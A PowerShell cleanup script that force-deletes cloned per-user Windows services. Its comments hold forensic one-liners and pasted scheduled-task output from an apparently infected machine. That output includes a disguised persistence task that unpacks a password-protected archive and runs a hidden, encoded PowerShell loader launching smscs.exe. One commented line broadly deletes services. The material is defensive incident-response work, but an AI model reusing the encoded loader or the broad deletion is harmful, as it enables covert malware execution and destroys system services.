# ===========================
#  Remove cloned user services
#  with suffix: _487f8ee0
#  Safely handles CurrentControlSet, ControlSet001, ControlSet002
# ===========================

$Suffix = "_487f8ee0$"

# Registry base for services
$ServicePaths = @(
    "HKLM:\SYSTEM\CurrentControlSet\Services",
    "HKLM:\SYSTEM\ControlSet001\Services",
    "HKLM:\SYSTEM\ControlSet002\Services"
)

Write-Host "Scanning for cloned services ending with $Suffix ..." -ForegroundColor Cyan

# 1. Enumerate service names matching the suffix
$Services = Get-WmiObject Win32_Service |
    Where-Object { $_.Name -match $Suffix }

if ($Services.Count -eq 0) {
    Write-Host "No cloned services matching suffix were found." -ForegroundColor Yellow
    return
}

Write-Host "Found $($Services.Count) services:" -ForegroundColor Green
$Services | Select Name, DisplayName, State, PathName | Format-Table

# 2. Try SC delete (will fail for USER_OWN_PROCESS, but harmless)
foreach ($svc in $Services) {
    Write-Host "`nTrying SC delete for: $($svc.Name)" -ForegroundColor Cyan
    sc.exe delete $svc.Name | Out-Null
}

# 3. Registry deletion (REAL removal)
foreach ($svc in $Services) {
    foreach ($base in $ServicePaths) {
        $RegPath = Join-Path $base $svc.Name
        if (Test-Path $RegPath) {

            Write-Host "Removing registry entry: $RegPath" -ForegroundColor Yellow

            # Fix permissions if needed
            try {
                $acl = Get-Acl $RegPath
                $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
                    "Administrators",
                    "FullControl",
                    "ContainerInherit,ObjectInherit",
                    "None",
                    "Allow"
                )
                $acl.SetAccessRule($rule)
                Set-Acl -Path $RegPath -AclObject $acl
            } catch {
                Write-Host "Could not modify ACL, trying Force delete." -ForegroundColor Magenta
            }

            # Delete the key
            Remove-Item $RegPath -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Write-Host "`nCleanup complete. A reboot is recommended." -ForegroundColor Green

<#

# phantom services
#
Get-WmiObject Win32_Service | Where-Object { $_.Name -match ".*_[a-f0-9]+$" } | forEach-Object { if ($_.State -eq 'Running') { Stop-Service -Name $_.Name -Force -ErrorAction SilentlyContinue }  sc.exe delete $_.Name }

Get-WmiObject Win32_Service | Where-Object { $_.Name -match "CredentialEnrollmentManagerUserSvc_487f8ee0_[a-f`0-9]+$" } | measure-object
get-WmiObject Win32_Service |  Where-Object { $_.Name -match  ".*_[a-f0-9]+$" } | where-object {$_.PathName -match '.*(Temp|Appdata).*' } | Select Name, DisplayName, PathName, State | format-lis

# rogue scheduled tasks
 Get-ScheduledTask | ForEach-Object {[PSCustomObject]@{    TaskName = $_.TaskName; Action   = ($_.Actions | ForEach-Object { $_.Execute }) ; Args     = ($_.Actions | ForEach-Object { $_.Arguments }) } }  |select-object -property Action,Args,TaskName| where-object { $_.Action -match '.*(AppData|Temp).*'} | Sort-Object TaskName | format-list

#>
<#

Action : C:\Users\kouzm\AppData\Local\programs\common\smscs.exe Args : TaskName : cache Action : %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe Args : /reporting TaskName : OneDrive Reporting Task-S-1-5-21-3826591462-1902725790-3394240593-1001 Action : %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe Args : TaskName : OneDrive Standalone Update Task-S-1-5-21-3826591462-1902725790-3394240593-1001 Action : C:\Users\kouzm\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\One DriveLauncher.exe Args : /startInstances TaskName : OneDrive Startup Task-S-1-5-21-3826591462-1902725790-3394240593-1001 Action : C:\Users\kouzm\AppData\Local\Vivaldi\Application\update_notifier.exe Args : --from-scheduler TaskName : VivaldiUpdateCheck-b979ca5e5ebd5df3 Action : {"C:\Users\kouzm\AppData\Local\Programs\Common\devlog", cmd} Args : {x "C:\Users\kouzm\AppData\Local\Programs\Common\oldfile" -tzip -o"C:\Users\kouzm\AppData\Local\Programs\Common" -p1bdbf03F6000Af0f1 96f4a9A50C82Ec7aB66AcB4B3114D10Da8a1E3Ecf8F41aA0bCdb2802cd7F3a682CEb 8555A488cB4 -y, /c start /min powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBv AG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAEkAZwBuAG8AcgBlACIACgAkAEQA IAA9ACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABwAHIAbwBn AHIAYQBtAHMAXABjAG8AbQBtAG8AbgAiAAoAJABSACAAPQAgACIAcwBtAHMAYwBzAC4A ZQB4AGUAIgAKAGcAYwBpACAAJABEACAALQBGAGkAbABlACAALQBGAG8AcgBjAGUAIAB8 ACAAPwAgAHsAIAAkAF8ALgBFAHgAdABlAG4AcwBpAG8AbgAgAC0AZQBxACAAIgAiACAA fQAgAHwAIAByAGkAIAAtAEYAbwByAGMAZQAKAGcAYwBpACAAJABEACAALQBGAGkAbABl ACAALQBGAG8AcgBjAGUAIAB8ACAAJQAgAHsAIAAkAF8ALgBBAHQAdAByAGkAYgB1AHQA ZQBzACAAPQAgACQAXwAuAEEAdAB0AHIAaQBiAHUAdABlAHMAIAAtAGIAbwByACAANgAg AH0ACgAkAEUAIAA9ACAAZwBjAGkAIAAkAEQAIAAtAGYAaQAgACoALgBlAHgAZQAgAC0A RgBpAGwAZQAgAC0ARgBvAHIAYwBlACAAfAAgAHMAbwByAHQAIABOAGEAbQBlACAAfAAg AHMAZQBsAGUAYwB0ACAALQBmACAAMQAKAGkAZgAgACgAJABFACkAIAB7ACAAcgBlAG4A IAAkAEUALgBGAHUAbABsAE4AYQBtAGUAIAAkAFIAIAAtAEYAbwByAGMAZQAgAH0ACgBT AHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgAkAEQAXAAkAFIAIgA=} TaskName : WinampServiceInitializationTask Action : C:\Users\kouzm\AppData\Local\programs\common\smscs.exe Args : TaskName : workerhost

#>
<#


Action : C:\Users\kouzm\AppData\Local\programs\common\smscs.exe 
Args : 
TaskName : cache 
Action : %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe 
Args : /reporting 
TaskName : OneDrive Reporting Task-S-1-5-21-3826591462-1902725790-3394240593-1001 
Action : %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe 
Args : 
TaskName : OneDrive Standalone Update Task-S-1-5-21-3826591462-1902725790-3394240593-1001 
Action : C:\Users\kouzm\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\One DriveLauncher.exe 
Args : /startInstances 
TaskName : OneDrive Startup Task-S-1-5-21-3826591462-1902725790-3394240593-1001 
Action : C:\Users\kouzm\AppData\Local\Vivaldi\Application\update_notifier.exe 
Args : --from-scheduler 
TaskName : VivaldiUpdateCheck-b979ca5e5ebd5df3 
Action : {"C:\Users\kouzm\AppData\Local\Programs\Common\devlog", cmd} 
Args : {x "C:\Users\kouzm\AppData\Local\Programs\Common\oldfile" -tzip -o"C:\Users\kouzm\AppData\Local\Programs\Common" -p1bdbf03F6000Af0f1 96f4a9A50C82Ec7aB66AcB4B3114D10Da8a1E3Ecf8F41aA0bCdb2802cd7F3a682CEb 8555A488cB4 -y, /c start /min powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBv AG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAEkAZwBuAG8AcgBlACIACgAkAEQA IAA9ACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABwAHIAbwBn AHIAYQBtAHMAXABjAG8AbQBtAG8AbgAiAAoAJABSACAAPQAgACIAcwBtAHMAYwBzAC4A ZQB4AGUAIgAKAGcAYwBpACAAJABEACAALQBGAGkAbABlACAALQBGAG8AcgBjAGUAIAB8 ACAAPwAgAHsAIAAkAF8ALgBFAHgAdABlAG4AcwBpAG8AbgAgAC0AZQBxACAAIgAiACAA fQAgAHwAIAByAGkAIAAtAEYAbwByAGMAZQAKAGcAYwBpACAAJABEACAALQBGAGkAbABl ACAALQBGAG8AcgBjAGUAIAB8ACAAJQAgAHsAIAAkAF8ALgBBAHQAdAByAGkAYgB1AHQA ZQBzACAAPQAgACQAXwAuAEEAdAB0AHIAaQBiAHUAdABlAHMAIAAtAGIAbwByACAANgAg AH0ACgAkAEUAIAA9ACAAZwBjAGkAIAAkAEQAIAAtAGYAaQAgACoALgBlAHgAZQAgAC0A RgBpAGwAZQAgAC0ARgBvAHIAYwBlACAAfAAgAHMAbwByAHQAIABOAGEAbQBlACAAfAAg AHMAZQBsAGUAYwB0ACAALQBmACAAMQAKAGkAZgAgACgAJABFACkAIAB7ACAAcgBlAG4A IAAkAEUALgBGAHUAbABsAE4AYQBtAGUAIAAkAFIAIAAtAEYAbwByAGMAZQAgAH0ACgBT AHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgAkAEQAXAAkAFIAIgA=} 
TaskName : WinampServiceInitializationTask 
Action : C:\Users\kouzm\AppData\Local\programs\common\smscs.exe 
Args : 
TaskName : workerhost

#>
